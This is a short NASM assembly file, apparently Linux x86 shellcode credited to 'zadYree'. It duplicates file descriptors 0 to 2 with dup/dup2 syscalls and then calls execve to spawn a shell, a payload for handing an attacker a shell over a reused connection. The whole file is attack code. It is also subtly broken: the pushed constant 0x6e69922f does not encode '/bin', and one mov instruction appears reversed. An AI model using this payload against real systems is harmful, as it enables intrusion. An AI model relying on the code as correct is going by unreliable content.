; credits  to zadYree, rewritten in nasm 


push 0x2 
pop ebx 
push 0x29
pop eax 
;call dup(2) 
int 0x80  

dec eax 
mov eax, esi 
xor ecx,ecx
push esi 
pop ebx 

loop: 
push 0x3f 
pop eax
int 0x80 
inc ecx 
cmp cl,0x3 
jne loop 

push byte 0xb 
pop eax 
cdq 
push edx 
xor esi,esi 
push esi 
push dword 0x68732f2f
push dword 0x6e69922f
mov ebx, esp 
xor ecx,ecx
int 0x80 

 





